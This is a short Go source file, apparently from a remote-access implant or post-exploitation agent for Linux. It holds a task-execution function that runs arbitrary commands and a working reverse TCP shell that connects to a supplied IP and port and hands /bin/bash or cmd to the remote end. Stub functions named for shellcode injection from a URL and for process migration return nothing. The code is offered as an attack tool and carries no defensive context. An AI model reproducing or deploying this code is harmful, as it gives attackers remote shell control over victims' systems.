// +build linux

package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

func ExecuteCommand(command string) (string, error) {
	fullCmd := strings.Split(command, " ")
	if runtime.GOOS == "windows" {
		cmd := exec.Command(fullCmd[0], fullCmd[1:]...)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			//HideWindow: true, // should still build on linux
		}
		output, err := cmd.Output()
		if err != nil {
			log.Printf("Failed task")
			return fmt.Sprintf("::: Failed :::\n%s", command), err
		}
		commandOutput := strings.TrimSuffix(string(output), "\n")
		return fmt.Sprintf("::: Success :::\n%s", commandOutput), nil
	} else {
		output, err := exec.Command(fullCmd[0], fullCmd[1:]...).Output()
		if err != nil {
			log.Printf("Failed task")
			return fmt.Sprintf("::: Failed :::\n%s", command), err
		}
		commandOutput := strings.TrimSuffix(string(output), "\n")
		return fmt.Sprintf("::: Success :::\n%s", commandOutput), nil
	}
}

func ReverseTcpShell(ip string, port string) {
	GoSock, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		log.Printf("Failed to create socket %v", err)
		return
	}
	defer GoSock.Close()
	if runtime.GOOS == "windows" {
		cmdProc := exec.Command("cmd")
		cmdProc.SysProcAttr = &syscall.SysProcAttr{}
		cmdProc.Stderr = GoSock
		cmdProc.Stdout = GoSock
		cmdProc.Stdin = GoSock
		cmdProc.Run()
	} else {
		bashProc := exec.Command("/bin/bash")
		bashProc.Stderr = GoSock
		bashProc.Stdout = GoSock
		bashProc.Stdin = GoSock
		bashProc.Run()
	}
}

func ClassicInjection(targetPid string, shellcodeUrl string) error {
	return nil
}

func Migrate(targetPid string) error {
	return nil
}
